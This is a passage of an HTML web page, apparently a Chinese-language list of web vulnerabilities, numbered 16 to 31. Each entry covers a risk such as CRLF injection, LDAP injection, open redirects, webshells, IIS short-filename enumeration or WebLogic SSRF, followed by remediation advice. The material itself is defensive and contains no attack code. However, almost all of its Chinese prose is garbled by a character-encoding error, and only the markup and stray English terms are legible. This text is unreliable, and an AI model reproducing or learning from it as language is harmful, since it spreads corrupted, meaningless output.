rel="noopener">https://www.freebuf.com/articles/web/167721.html</a></p><p>ã€€ã€€<strong>ä¿®å¤å»ºè®®</strong></p><p>ã€€ã€€1ã€å¯¹ä¼ å…¥çš„å¯¹è±¡è¿›è¡Œä¸¥æ ¼çš„è¿‡æ»¤æ£€æŸ¥</p><p>ã€€ã€€2ã€åœ¨ååºåˆ—åŒ–è¿‡ç¨‹æ‰§è¡Œçš„æ–‡ä»¶è¯»å†™ã€å‘½ä»¤æˆ–ä»£ç æ‰§è¡Œå‡½æ•°ä¸­æ˜¯å¦æœ‰ç”¨æˆ·å¯æ§çš„å‚æ•°ã€‚</p><h2 id="16-http-slowæ‹’ç»æœåŠ¡æ”»å‡»"><a href="#16-http-slowæ‹’ç»æœåŠ¡æ”»å‡»" class="headerlink" title="16.http slowæ‹’ç»æœåŠ¡æ”»å‡»"></a>16.http slowæ‹’ç»æœåŠ¡æ”»å‡»</h2><p>ã€€ã€€<strong>æ¼æ´æè¿°</strong></p><p>ã€€ã€€æŒ‰ç…§è®¾è®¡ï¼ŒHTTPåè®®è¦æ±‚æœåŠ¡å™¨åœ¨å¤„ç†ä¹‹å‰å®Œå…¨æ¥æ”¶è¯·æ±‚ã€‚ å¦‚æœHTTPè¯·æ±‚æ²¡æœ‰å®Œæˆï¼Œæˆ–è€…ä¼ è¾“é€Ÿç‡éå¸¸ä½ï¼ŒæœåŠ¡å™¨ä¼šä¿æŒå…¶èµ„æºå¿™äºç­‰å¾…å…¶ä½™æ•°æ®ã€‚å¦‚æœæœåŠ¡å™¨ä¿æŒå¤ªå¤šçš„èµ„æºè¯·æ±‚å’Œå¤„ç†ï¼Œè¿™å°†é€ æˆä¸€ä¸ªæ‹’ç»æœåŠ¡ã€‚ä¸¥é‡è€…ä¸€å°ä¸»æœºå³å¯è®©webè¿è¡Œç¼“æ…¢ç”šè‡³æ˜¯å´©æºƒã€‚</p><p>ã€€ã€€<strong>ä¿®å¤å»ºè®®</strong></p><p>ã€€ã€€å¯¹äº Apache å¯ä»¥åšä»¥ä¸‹ä¼˜åŒ–ï¼ˆå…¶ä»–æœåŠ¡å™¨åŸç†ç›¸åŒï¼‰ï¼š</p><p>ã€€ã€€1ã€è®¾ç½®åˆé€‚çš„ timeout æ—¶é—´ï¼ˆApache å·²é»˜è®¤å¯ç”¨äº† reqtimeout æ¨¡å—ï¼‰ï¼Œè§„å®šäº† Header å‘é€çš„æ—¶é—´ä»¥åŠé¢‘ç‡å’Œ Body å‘é€çš„æ—¶é—´ä»¥åŠé¢‘ç‡</p><p>ã€€ã€€2ã€å¢å¤§ MaxClients(MaxRequestWorkers)ï¼šå¢åŠ æœ€å¤§çš„è¿æ¥æ•°ã€‚æ ¹æ®å®˜æ–¹æ–‡æ¡£ï¼Œä¸¤ä¸ªå‚æ•°æ˜¯ä¸€å›äº‹ï¼Œç‰ˆæœ¬ä¸åŒï¼ŒMaxRequestWorkers was called MaxClients before version 2.3.13.Theold name is still supported.</p><p>ã€€ã€€3ã€é»˜è®¤å®‰è£…çš„ Apache å­˜åœ¨ Slow Attack çš„å¨èƒï¼ŒåŸå› å°±æ˜¯è™½ç„¶è®¾ç½®çš„ timeouteï¼Œä½†æ˜¯æœ€å¤§è¿æ¥æ•°ä¸å¤Ÿï¼Œå¦‚æœæ”»å‡»çš„è¯·æ±‚é¢‘ç‡è¶³å¤Ÿå¤§ï¼Œä»ç„¶ä¼šå æ»¡Apacheçš„æ‰€æœ‰è¿æ¥</p><h2 id="17-CRLFæ³¨å…¥"><a href="#17-CRLFæ³¨å…¥" class="headerlink" title="17.CRLFæ³¨å…¥"></a>17.CRLFæ³¨å…¥</h2><p>ã€€ã€€<strong>æ¼æ´æè¿°</strong></p><p>ã€€ã€€CRLF æ˜¯â€œå›è½¦ +æ¢è¡Œâ€ï¼ˆ\r\nï¼‰çš„ç®€ç§°ã€‚åœ¨ HTTP åè®®ä¸­ï¼ŒHTTPHeader ä¸ HTTP Body æ˜¯ç”¨ä¸¤ä¸ª CRLF ç¬¦å·è¿›è¡Œåˆ†éš”çš„ï¼Œæµè§ˆå™¨æ ¹æ®è¿™ä¸¤ä¸ª CRLF ç¬¦å·æ¥è·å– HTTP å†…å®¹å¹¶æ˜¾ç¤ºã€‚å› æ­¤ï¼Œä¸€æ—¦æ”»å‡»è€…èƒ½å¤Ÿæ§åˆ¶ HTTP æ¶ˆæ¯å¤´ä¸­çš„å­—ç¬¦ï¼Œæ³¨å…¥ä¸€äº›æ¶æ„çš„æ¢è¡Œï¼Œå°±èƒ½æ³¨å…¥ä¸€äº›ä¼šè¯ Cookie æˆ–è€… HTML ä»£ç ã€‚</p><p>ã€€ã€€<strong>ä¿®å¤å»ºè®®</strong></p><p>ã€€ã€€1ã€è¿‡æ»¤ \r ã€\n åŠå…¶å„ç§ç¼–ç çš„æ¢è¡Œç¬¦ï¼Œé¿å…è¾“å…¥çš„æ•°æ®æ±¡æŸ“åˆ°å…¶ä»– HTTP æ¶ˆæ¯å¤´ã€‚</p><h2 id="18-LDAPæ³¨å…¥"><a href="#18-LDAPæ³¨å…¥" class="headerlink" title="18.LDAPæ³¨å…¥"></a>18.LDAPæ³¨å…¥</h2><p>ã€€ã€€<strong>æ¼æ´æè¿°</strong></p><p>ã€€ã€€ç”±äºWeb åº”ç”¨ç¨‹åºæ²¡æœ‰å¯¹ç”¨æˆ·å‘é€çš„æ•°æ®è¿›è¡Œé€‚å½“è¿‡æ»¤å’Œæ£€æŸ¥ï¼Œæ”»å‡»è€…å¯ä¿®æ”¹LDAP è¯­å¥çš„ç»“æ„ï¼Œå¹¶ä¸”ä»¥æ•°æ®åº“æœåŠ¡å™¨ã€Web æœåŠ¡å™¨ç­‰çš„æƒé™æ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œè®¸å¯æƒå¯èƒ½ä¼šå…è®¸æŸ¥è¯¢ã€ä¿®æ”¹æˆ–é™¤å» LDAP æ ‘çŠ¶æ„é€ å†…ä»»ä½•æ•°æ®ã€‚</p><p>ã€€ã€€<strong>ä¿®å¤å»ºè®®</strong></p><p>ã€€ã€€å¯¹ç”¨æˆ·çš„è¾“å…¥å†…å®¹è¿›è¡Œä¸¥æ ¼çš„è¿‡æ»¤ã€‚</p><h2 id="19-URL-è·³è½¬"><a href="#19-URL-è·³è½¬" class="headerlink" title="19.URL è·³è½¬"></a>19.URL è·³è½¬</h2><p>ã€€ã€€<strong>æ¼æ´æè¿°</strong></p><p>ã€€ã€€æœ‰çš„Web åº”ç”¨ç¨‹åºä¸­ä½¿ç”¨URLå‚æ•°ä¸­çš„åœ°å€ä½œä¸ºè·³è½¬é“¾æ¥çš„åŠŸèƒ½ ï¼Œæ”»å‡»è€…å¯å®æ–½é’“é±¼ã€æ¶æ„ç½‘ç«™è·³è½¬ç­‰æ”»å‡»ã€‚</p><p>ã€€ã€€<strong>ä¿®å¤å»ºè®®</strong></p><p>ã€€ã€€1ã€åœ¨è¿›è¡Œé¡µé¢è·³è½¬å‰æ ¡éªŒä¼ å…¥çš„URLæ˜¯å¦ä¸ºå¯ä¿¡åŸŸåã€‚</p><p>ã€€ã€€2ã€ç™½åå•è§„å®šè·³è½¬é“¾æ¥</p><h2 id="20-æ˜æ–‡ä¼ è¾“"><a href="#20-æ˜æ–‡ä¼ è¾“" class="headerlink" title="20.æ˜æ–‡ä¼ è¾“"></a>20.æ˜æ–‡ä¼ è¾“</h2><p>ã€€ã€€<strong>æ¼æ´æè¿°</strong></p><p>ã€€ã€€ç”¨æˆ·ç™»å½•è¿‡ç¨‹ä¸­ä½¿ç”¨æ˜æ–‡ä¼ è¾“ç”¨æˆ·ç™»å½•ä¿¡æ¯ï¼Œè‹¥ç”¨æˆ·é­å—ä¸­é—´äººæ”»å‡»æ—¶ï¼Œæ”»å‡»è€…å¯ç›´æ¥è·å–è¯¥ç”¨æˆ·ç™»å½•è´¦æˆ·ï¼Œä»è€Œè¿›è¡Œè¿›ä¸€æ­¥æ¸—é€ã€‚</p><p>ã€€ã€€<strong>ä¿®å¤å»ºè®®</strong></p><p>ã€€ã€€1ã€ç”¨æˆ·ç™»å½•ä¿¡æ¯ä½¿ç”¨åŠ å¯†ä¼ è¾“ï¼Œå¦‚å¯†ç åœ¨ä¼ è¾“å‰ä½¿ç”¨å®‰å…¨çš„ç®—æ³•åŠ å¯†åä¼ è¾“ï¼Œå¯é‡‡ç”¨çš„ç®—æ³•åŒ…æ‹¬ï¼šä¸å¯é€†hashç®—æ³•åŠ ç›ï¼ˆ4ä½åŠä»¥ä¸Šéšæœºæ•°ï¼Œç”±æœåŠ¡å™¨ç«¯äº§ç”Ÿï¼‰ï¼›å®‰å…¨å¯¹ç§°åŠ å¯†ç®—æ³•ï¼Œå¦‚AES(128ã€192ã€256ä½)ï¼Œä¸”å¿…é¡»ä¿è¯å®¢æˆ·ç«¯å¯†é’¥å®‰å…¨ï¼Œä¸å¯è¢«ç ´è§£æˆ–è¯»å‡ºï¼›éå¯¹ç§°åŠ å¯†ç®—æ³•ï¼Œå¦‚RSA(ä¸ä½äº1024ä½)ã€SM2ç­‰ã€‚</p><p>ã€€ã€€2ã€ä½¿ç”¨httpsæ¥ä¿è¯ä¼ è¾“çš„å®‰å…¨ã€‚</p><h2 id="21-ç½‘é¡µæœ¨é©¬"><a href="#21-ç½‘é¡µæœ¨é©¬" class="headerlink" title="21.ç½‘é¡µæœ¨é©¬"></a>21.ç½‘é¡µæœ¨é©¬</h2><p>ã€€ã€€<strong>æ¼æ´æè¿°</strong></p><p>ã€€ã€€ç»æ¸—é€æµ‹è¯•å‘ç°ç›®æ ‡ç«™ç‚¹å­˜åœ¨webshellï¼Œæ”»å‡»è€…å¯ç›´æ¥çˆ†ç ´å£ä»¤ä½¿ç”¨æœ¨é©¬ï¼Œéå¸¸ä½æˆæœ¬çš„è¿›è¡Œæ¶æ„æ“ä½œã€‚</p><p>ã€€ã€€<strong>ä¿®å¤å»ºè®®</strong></p><p>ã€€ã€€1ã€ç¡®è®¤å¹¶åˆ é™¤æœ¨é©¬æ–‡ä»¶ï¼Œå¹¶è¿›è¡Œæœ¬åœ°æ–‡ä»¶æ¼æ´æ‰«ææ’æŸ¥æ˜¯å¦è¿˜å­˜åœ¨æœ‰å…¶ä»–æœ¨é©¬ã€‚</p><p>ã€€ã€€2ã€å‘ç°å¹¶åŠæ—¶ä¿®å¤å·²å­˜åœ¨çš„æ¼æ´ã€‚</p><p>ã€€ã€€3ã€é€šè¿‡æŸ¥çœ‹æ—¥å¿—ã€æœåŠ¡å™¨æ€æ¯’ç­‰å®‰å…¨æ’æŸ¥ï¼Œç¡®ä¿æœåŠ¡å™¨æœªè¢«ç•™ä¸‹åé—¨</p><h2 id="22-å¤‡ä»½æ–‡ä»¶æ³„éœ²"><a href="#22-å¤‡ä»½æ–‡ä»¶æ³„éœ²" class="headerlink" title="22.å¤‡ä»½æ–‡ä»¶æ³„éœ²"></a>22.å¤‡ä»½æ–‡ä»¶æ³„éœ²</h2><p>ã€€ã€€<strong>æ¼æ´æè¿°</strong></p><p>ã€€ã€€ç½‘ç«™å¤‡ä»½æ–‡ä»¶æˆ–ã€æ•æ„Ÿä¿¡æ¯æ–‡ä»¶å­˜æ”¾åœ¨æŸä¸ªç½‘ç«™ç›®å½•ä¸‹ï¼Œæ”»å‡»è€…å¯é€šè¿‡æ–‡ä»¶æ‰«æç­‰æ–¹æ³•å‘ç°å¹¶ä¸‹è½½è¯¥å¤‡ä»½æ–‡ä»¶ï¼Œå¯¼è‡´ç½‘ç«™æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€‚</p><p>ã€€ã€€<strong>ä¿®å¤å»ºè®®</strong></p><p>ã€€ã€€1ã€ä¸åœ¨ç½‘ç«™ç›®å½•ä¸‹å­˜æ”¾ç½‘ç«™å¤‡ä»½æ–‡ä»¶æˆ–æ•æ„Ÿä¿¡æ¯çš„æ–‡ä»¶ã€‚</p><p>ã€€ã€€2ã€å¦‚éœ€å­˜æ”¾è¯¥ç±»æ–‡ä»¶ï¼Œè¯·å°†æ–‡ä»¶åå‘½åä¸ºéš¾ä»¥çŒœè§£çš„æ— è§„åˆ™å­—ç¬¦ä¸²ã€‚</p><h2 id="23-æ•æ„Ÿä¿¡æ¯æ³„éœ²"><a href="#23-æ•æ„Ÿä¿¡æ¯æ³„éœ²" class="headerlink" title="23.æ•æ„Ÿä¿¡æ¯æ³„éœ²"></a>23.æ•æ„Ÿä¿¡æ¯æ³„éœ²</h2><p>ã€€ã€€<strong>æ¼æ´æè¿°</strong></p><p>ã€€ã€€åœ¨é¡µé¢ä¸­æˆ–è€…è¿”å›çš„å“åº”åŒ…ä¸­æ³„éœ²äº†æ•æ„Ÿä¿¡æ¯ï¼Œé€šè¿‡è¿™äº›ä¿¡æ¯ï¼Œç»™æ”»å‡»è€…æ¸—é€æä¾›äº†éå¸¸å¤šçš„æœ‰ç”¨ä¿¡æ¯ã€‚</p><p>ã€€ã€€<strong>ä¿®å¤å»ºè®®</strong></p><p>ã€€ã€€1ã€å¦‚æœæ˜¯æ¢é’ˆæˆ–æµ‹è¯•é¡µé¢ç­‰æ— ç”¨çš„ç¨‹åºå»ºè®®åˆ é™¤ï¼Œæˆ–è€…ä¿®æ”¹æˆéš¾ä»¥çŒœè§£çš„åå­—ã€‚</p><p>ã€€ã€€2ã€ä¸å½±å“ä¸šåŠ¡æˆ–åŠŸèƒ½çš„æƒ…å†µä¸‹åˆ é™¤æˆ–ç¦æ­¢è®¿é—®æ³„éœ²æ•æ„Ÿä¿¡æ¯é¡µé¢ã€‚</p><p>ã€€ã€€3ã€åœ¨æœåŠ¡å™¨ç«¯å¯¹ç›¸å…³æ•æ„Ÿä¿¡æ¯è¿›è¡Œæ¨¡ç³ŠåŒ–å¤„ç†ã€‚</p><p>ã€€ã€€4ã€å¯¹æœåŠ¡å™¨ç«¯è¿”å›çš„æ•°æ®è¿›è¡Œä¸¥æ ¼çš„æ£€æŸ¥ï¼Œæ»¡è¶³æŸ¥è¯¢æ•°æ®ä¸é¡µé¢æ˜¾ç¤ºæ•°æ®ä¸€è‡´ã€‚</p><h2 id="24-çŸ­ä¿¡-é‚®ä»¶è½°ç‚¸"><a href="#24-çŸ­ä¿¡-é‚®ä»¶è½°ç‚¸" class="headerlink" title="24.çŸ­ä¿¡/é‚®ä»¶è½°ç‚¸"></a>24.çŸ­ä¿¡/é‚®ä»¶è½°ç‚¸</h2><p>ã€€ã€€<strong>æ¼æ´æè¿°</strong></p><p>ã€€ã€€ç”±äºæ²¡æœ‰å¯¹çŸ­ä¿¡æˆ–è€…é‚®ä»¶å‘é€æ¬¡æ•°è¿›è¡Œé™åˆ¶ï¼Œå¯¼è‡´å¯æ— é™æ¬¡å‘é€çŸ­ä¿¡æˆ–é‚®ä»¶ç»™ç”¨æˆ·ï¼Œä»è€Œé€ æˆçŸ­ä¿¡è½°ç‚¸ï¼Œè¿›è€Œå¯èƒ½è¢«å¤§é‡ç”¨æˆ·æŠ•è¯‰ï¼Œä»è€Œå½±å“å…¬å¸å£°èª‰ã€‚</p><p>ã€€ã€€<strong>ä¿®å¤å»ºè®®</strong></p><p>ã€€ã€€åœ¨æœåŠ¡å™¨é™åˆ¶å‘é€çŸ­ä¿¡æˆ–é‚®ä»¶çš„é¢‘ç‡ï¼Œå¦‚åŒä¸€è´¦å·1åˆ†é’Ÿåªèƒ½å‘é€1æ¬¡çŸ­ä¿¡æˆ–é‚®ä»¶ï¼Œä¸€å¤©åªèƒ½å‘é€3æ¬¡ã€‚</p><h2 id="25-phpinfoä¿¡æ¯æ³„æ¼"><a href="#25-phpinfoä¿¡æ¯æ³„æ¼" class="headerlink" title="25.phpinfoä¿¡æ¯æ³„æ¼"></a>25.phpinfoä¿¡æ¯æ³„æ¼</h2><p>ã€€ã€€<strong>æ¼æ´æè¿°</strong></p><p>ã€€ã€€Webç«™ç‚¹çš„æŸäº›æµ‹è¯•é¡µé¢å¯èƒ½ä¼šä½¿ç”¨åˆ°PHPçš„phpinfo()å‡½æ•°ï¼Œä¼šè¾“å‡ºæœåŠ¡å™¨çš„å…³é”®ä¿¡æ¯ï¼Œé€ æˆæœåŠ¡å™¨ä¿¡æ¯æ³„éœ²ï¼Œä¸ºæ”»å‡»æä¾›æœ‰åˆ©çš„ä¿¡æ¯ã€‚</p><p>ã€€ã€€<strong>ä¿®å¤å»ºè®®</strong></p><p>ã€€ã€€1ã€åˆ é™¤phpinfo å‡½æ•°ã€‚</p><p>ã€€ã€€2ã€è‹¥æ–‡ä»¶æ— ç”¨å¯ç›´æ¥åˆ é™¤ã€‚ </p><h2 id="26-IISçŸ­æ–‡ä»¶åæ³„éœ²æ¼æ´"><a href="#26-IISçŸ­æ–‡ä»¶åæ³„éœ²æ¼æ´" class="headerlink" title="26.IISçŸ­æ–‡ä»¶åæ³„éœ²æ¼æ´"></a>26.IISçŸ­æ–‡ä»¶åæ³„éœ²æ¼æ´</h2><p>ã€€ã€€<strong>æ¼æ´æè¿°</strong></p><p>ã€€ã€€Internet Information Servicesï¼ˆIISï¼Œäº’è”ç½‘ä¿¡æ¯æœåŠ¡ï¼‰æ˜¯ç”±å¾®è½¯å…¬å¸æä¾›çš„åŸºäºè¿è¡ŒMicrosoft Windowsçš„äº’è”ç½‘åŸºæœ¬æœåŠ¡ã€‚ Microsoft IISåœ¨å®ç°ä¸Šå­˜åœ¨æ–‡ä»¶æšä¸¾æ¼æ´ï¼Œæ”»å‡»è€…å¯åˆ©ç”¨æ­¤æ¼æ´æšä¸¾ç½‘ç»œæœåŠ¡å™¨æ ¹ç›®å½•ä¸­çš„æ–‡ä»¶ã€‚å±å®³ï¼šæ”»å‡»è€…å¯ä»¥åˆ©ç”¨â€œ~â€å­—ç¬¦çŒœè§£æˆ–éå†æœåŠ¡å™¨ä¸­çš„æ–‡ä»¶åï¼Œæˆ–å¯¹IISæœåŠ¡å™¨ä¸­çš„.Net Frameworkè¿›è¡Œæ‹’ç»æœåŠ¡æ”»å‡»ã€‚</p><p>ã€€ã€€æ”»å‡»è€…å¯é€šè¿‡è¯¥æ¼æ´å°è¯•è·å–ç½‘ç«™æœåŠ¡å™¨æ–‡ä»¶çš„æ–‡ä»¶åï¼Œè¾¾åˆ°è·å–æ›´å¤šä¿¡æ¯æ¥å…¥ä¾µæœåŠ¡å™¨çš„ç›®çš„ã€‚</p><p>ã€€ã€€<strong>ä¿®å¤å»ºè®®</strong></p><p>ã€€ã€€ä¿®æ”¹Windowsé…ç½®ï¼Œå…³é—­çŸ­æ–‡ä»¶ååŠŸèƒ½ã€‚</p><p>ã€€ã€€1.å…³é—­NTFS 8.3æ–‡ä»¶æ ¼å¼çš„æ”¯æŒã€‚è¯¥åŠŸèƒ½é»˜è®¤æ˜¯å¼€å¯çš„ï¼Œå¯¹äºå¤§å¤šæ•°ç”¨æˆ·æ¥è¯´æ— éœ€å¼€å¯ã€‚</p><p>ã€€ã€€2.å¦‚æœæ˜¯è™šæ‹Ÿä¸»æœºç©ºé—´ç”¨æˆ·,å¯é‡‡ç”¨ä»¥ä¸‹ä¿®å¤æ–¹æ¡ˆï¼š</p><p>ã€€ã€€1ï¼‰ä¿®æ”¹æ³¨å†Œåˆ—è¡¨HKLM\SYSTEM\CurrentControlSet\Control\FileSystem\NtfsDisable8dot3NameCreationçš„å€¼ä¸º1(æ­¤ä¿®æ”¹åªèƒ½ç¦æ­¢NTFS8.3æ ¼å¼æ–‡ä»¶ååˆ›å»º,å·²ç»å­˜åœ¨çš„æ–‡ä»¶çš„çŸ­æ–‡ä»¶åæ— æ³•ç§»é™¤)ã€‚</p><p>ã€€ã€€2ï¼‰å¦‚æœä½ çš„webç¯å¢ƒä¸éœ€è¦asp.netçš„æ”¯æŒä½ å¯ä»¥è¿›å…¥Internet ä¿¡æ¯æœåŠ¡(IIS)ç®¡ç†å™¨ â€” Web æœåŠ¡æ‰©å±• - ASP.NET é€‰æ‹©ç¦æ­¢æ­¤åŠŸèƒ½ã€‚</p><p>ã€€ã€€3ï¼‰å‡çº§net framework è‡³4.0ä»¥ä¸Šç‰ˆæœ¬ã€‚</p><p>ã€€ã€€3.å°†webæ–‡ä»¶å¤¹çš„å†…å®¹æ‹·è´åˆ°å¦ä¸€ä¸ªä½ç½®ï¼Œæ¯”å¦‚D:\wwwåˆ°D:\<a href="http://www.backï¼Œç„¶ååˆ é™¤åŸæ–‡ä»¶å¤¹D:\\wwwï¼Œå†é‡å‘½åD:\\www.backåˆ°D:\\wwwã€‚å¦‚æœä¸é‡æ–°å¤åˆ¶ï¼Œå·²ç»å­˜åœ¨çš„çŸ­æ–‡ä»¶ååˆ™æ˜¯ä¸ä¼šæ¶ˆå¤±çš„ã€‚" target="_blank" rel="noopener">www.backï¼Œç„¶ååˆ é™¤åŸæ–‡ä»¶å¤¹D:\\wwwï¼Œå†é‡å‘½åD:\\www.backåˆ°D:\\wwwã€‚å¦‚æœä¸é‡æ–°å¤åˆ¶ï¼Œå·²ç»å­˜åœ¨çš„çŸ­æ–‡ä»¶ååˆ™æ˜¯ä¸ä¼šæ¶ˆå¤±çš„ã€‚</a></p><h2 id="27-åº”ç”¨ç¨‹åºé”™è¯¯ä¿¡æ¯æ³„éœ²"><a href="#27-åº”ç”¨ç¨‹åºé”™è¯¯ä¿¡æ¯æ³„éœ²" class="headerlink" title="27.åº”ç”¨ç¨‹åºé”™è¯¯ä¿¡æ¯æ³„éœ²"></a>27.åº”ç”¨ç¨‹åºé”™è¯¯ä¿¡æ¯æ³„éœ²</h2><p>ã€€ã€€<strong>æ¼æ´æè¿°</strong></p><p>ã€€ã€€æ”»å‡»è€…å¯é€šè¿‡ç‰¹æ®Šçš„æ”»å‡»å‘é‡ï¼Œä½¿webæœåŠ¡å™¨å‡ºç°500ã€403ç­‰ç›¸å…³é”™è¯¯ï¼Œå¯¼è‡´ä¿¡æ¯æ³„æ¼å¦‚ç»å¯¹è·¯å¾„ã€webserverç‰ˆæœ¬ã€æºä»£ç ã€sqlè¯­å¥ç­‰æ•æ„Ÿä¿¡æ¯ï¼Œæ¶æ„æ”»å‡»è€…å¾ˆæœ‰å¯èƒ½åˆ©ç”¨è¿™äº›ä¿¡æ¯å®æ–½è¿›ä¸€æ­¥çš„æ”»å‡»ã€‚</p><p>ã€€ã€€<strong>ä¿®å¤å»ºè®®</strong></p><p>ã€€ã€€1ã€è‡ªå®šä¹‰é”™è¯¯é¡µé¢æˆ–ä½¿ç”¨ç»Ÿä¸€çš„é”™è¯¯é¡µé¢æç¤ºã€‚</p><h2 id="28-Apache-Tomcaté»˜è®¤æ–‡ä»¶"><a href="#28-Apache-Tomcaté»˜è®¤æ–‡ä»¶" class="headerlink" title="28.Apache Tomcaté»˜è®¤æ–‡ä»¶"></a>28.Apache Tomcaté»˜è®¤æ–‡ä»¶</h2><p>ã€€ã€€<strong>æ¼æ´æè¿°</strong></p><p>ã€€ã€€Apache Tomcaté»˜è®¤æ ·ä¾‹æ–‡ä»¶æ²¡æœ‰åˆ é™¤æˆ–é™åˆ¶è®¿é—®ï¼Œå¯èƒ½å­˜åœ¨cookieã€sessionä¼ªé€ ï¼Œè¿›è¡Œåå°ç™»å½•æ“ä½œ</p><p>ã€€ã€€<strong>ä¿®å¤å»ºè®®</strong></p><p>ã€€ã€€1ã€åˆ é™¤æ ·ä¾‹æ–‡ä»¶</p><p>ã€€ã€€2ã€é™åˆ¶æ–‡ä»¶è®¿é—®æƒé™</p><h2 id="29-Crossdomain-xml-é…ç½®ä¸å½“"><a href="#29-Crossdomain-xml-é…ç½®ä¸å½“" class="headerlink" title="29.Crossdomain.xml é…ç½®ä¸å½“"></a>29.Crossdomain.xml é…ç½®ä¸å½“</h2><p>ã€€ã€€<strong>æ¼æ´æè¿°</strong></p><p>ã€€ã€€ç½‘ç«™æ ¹ç›®å½•ä¸‹çš„ crossdomain.xml æ–‡ä»¶æŒ‡æ˜äº†è¿œç¨‹Flash æ˜¯å¦å¯ä»¥åŠ è½½å½“å‰ç½‘ç«™çš„èµ„æºï¼ˆå›¾ç‰‡ã€ç½‘é¡µå†…å®¹ã€Flashç­‰ï¼‰ã€‚å¦‚æœé…ç½®ä¸å½“ï¼Œå¯èƒ½å¯¼è‡´é­å—è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼ˆCSRFï¼‰æ”»å‡»ã€‚</p><p>ã€€ã€€<strong>ä¿®å¤å»ºè®®</strong></p><p>ã€€ã€€å¯¹äºä¸éœ€è¦ä»å¤–éƒ¨åŠ è½½èµ„æºçš„ç½‘ç«™ï¼Œåœ¨ crossdomain.xml æ–‡ä»¶ä¸­æ›´æ”¹allow-access-fromçš„domainå±æ€§ä¸ºåŸŸåç™½åå•ã€‚</p><h2 id="30-ç›®æ ‡æœåŠ¡å™¨å¯ç”¨äº†ä¸å®‰å…¨-HTTP-æ–¹æ³•"><a href="#30-ç›®æ ‡æœåŠ¡å™¨å¯ç”¨äº†ä¸å®‰å…¨-HTTP-æ–¹æ³•" class="headerlink" title="30.ç›®æ ‡æœåŠ¡å™¨å¯ç”¨äº†ä¸å®‰å…¨ HTTP æ–¹æ³•"></a>30.ç›®æ ‡æœåŠ¡å™¨å¯ç”¨äº†ä¸å®‰å…¨ HTTP æ–¹æ³•</h2><p>ã€€ã€€<strong>æ¼æ´æè¿°</strong></p><p>ã€€ã€€ç›®æ ‡æœåŠ¡å™¨å¯ç”¨äº†ä¸å®‰å…¨çš„ä¼ è¾“æ–¹æ³•ï¼Œå¦‚PUTã€TRACEã€DELETEã€MOVEç­‰ï¼Œè¿™äº›æ–¹æ³•è¡¨ç¤ºå¯èƒ½åœ¨æœåŠ¡å™¨ä¸Šä½¿ç”¨äº† WebDAVï¼Œç”±äºdavæ–¹æ³•å…è®¸å®¢æˆ·ç«¯æ“çºµæœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ï¼Œå¦‚ä¸Šä¼ ã€ä¿®æ”¹ã€åˆ é™¤ç›¸å…³æ–‡ä»¶ç­‰å±é™©æ“ä½œï¼Œå¦‚æœæ²¡æœ‰åˆç†é…ç½®davï¼Œæœ‰å¯èƒ½å…è®¸æœªæˆæƒçš„ç”¨æˆ·å¯¹å…¶è¿›è¡Œåˆ©ç”¨ï¼Œä¿®æ”¹æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ã€‚</p><p>ã€€ã€€<strong>ä¿®å¤å»ºè®®</strong></p><p>ã€€ã€€1ã€å…³é—­ä¸å®‰å…¨çš„ä¼ è¾“æ–¹æ³•ï¼Œåªå¼€å¯POSTã€GETæ–¹æ³•ã€‚</p><p>ã€€ã€€2ã€å¦‚æœæœåŠ¡å™¨ä¸ä½¿ç”¨ WebDAV å¯ç›´æ¥ç¦ç”¨ï¼Œæˆ–ä¸ºå…è®¸webdavçš„ç›®å½•é…ç½®ä¸¥æ ¼çš„è®¿é—®æƒé™ï¼Œå¦‚è®¤è¯æ–¹æ³•ï¼Œè®¤è¯éœ€è¦çš„ç”¨æˆ·åï¼Œå¯†ç ã€‚</p><h2 id="31-weblogic-SSRFæœåŠ¡å™¨è¯·æ±‚ä¼ªé€ "><a href="#31-weblogic-SSRFæœåŠ¡å™¨è¯·æ±‚ä¼ªé€ " class="headerlink" title="31.weblogic SSRFæœåŠ¡å™¨è¯·æ±‚ä¼ªé€ "></a>31.weblogic SSRFæœåŠ¡å™¨è¯·æ±‚ä¼ªé€ </h2><p>ã€€ã€€<strong>æ¼æ´æè¿°</strong></p><p>ã€€ã€€ç›®æ ‡å­˜åœ¨weblogic SSRFæœåŠ¡å™¨è¯·æ±‚ä¼ªé€ æ¼æ´ã€‚WebLogicæ˜¯ç”¨äºå¼€å‘ã€é›†æˆã€éƒ¨ç½²å’Œç®¡ç†å¤§å‹åˆ†å¸ƒå¼Webåº”ç”¨ã€ç½‘ç»œåº”ç”¨å’Œæ•°æ®åº“åº”ç”¨çš„Javaåº”ç”¨æœåŠ¡å™¨ã€‚SSRF(Server-Side Request Forgery:æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ) æ˜¯ä¸€ç§ç”±æ”»å‡»è€…æ„é€ å½¢æˆç”±æœåŠ¡ç«¯å‘èµ·è¯·æ±‚çš„ä¸€ä¸ªå®‰å…¨æ¼æ´ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒSSRFæ”»å‡»çš„ç›®æ ‡æ˜¯ä»å¤–ç½‘æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿã€‚ï¼ˆæ­£æ˜¯å› ä¸ºå®ƒæ˜¯ç”±æœåŠ¡ç«¯å‘èµ·çš„ï¼Œæ‰€ä»¥å®ƒèƒ½å¤Ÿè¯·æ±‚åˆ°ä¸å®ƒç›¸è¿è€Œä¸å¤–ç½‘éš”ç¦»çš„å†…éƒ¨ç³»ç»Ÿï¼‰ã€‚Weblogicä¸­é—´ä»¶é»˜è®¤å¸¦æœ‰â€œUDDI ç›®å½•æµè§ˆå™¨â€ä¸”ä¸ºæœªæˆæƒè®¿é—®ï¼Œé€šè¿‡è¯¥åº”ç”¨ï¼Œå¯è¿›è¡Œæ— å›æ˜¾çš„SSRFè¯·æ±‚ã€‚æ”»å‡»è€…å¯åˆ©ç”¨è¯¥æ¼æ´å¯¹ä¼ä¸šå†…ç½‘è¿›è¡Œå¤§è§„æ¨¡æ‰«æï¼Œäº†è§£å†…ç½‘ç»“æ„ï¼Œå¹¶å¯èƒ½ç»“åˆå†…ç½‘æ¼æ´ç›´æ¥è·å–æœåŠ¡å™¨æƒé™ã€‚</p><p>ã€€ã€€<strong>ä¿®å¤å»ºè®®</strong></p><p>ã€€ã€€1ã€è‹¥ä¸å½±å“ä¸šåŠ¡åˆ™å¯åˆ 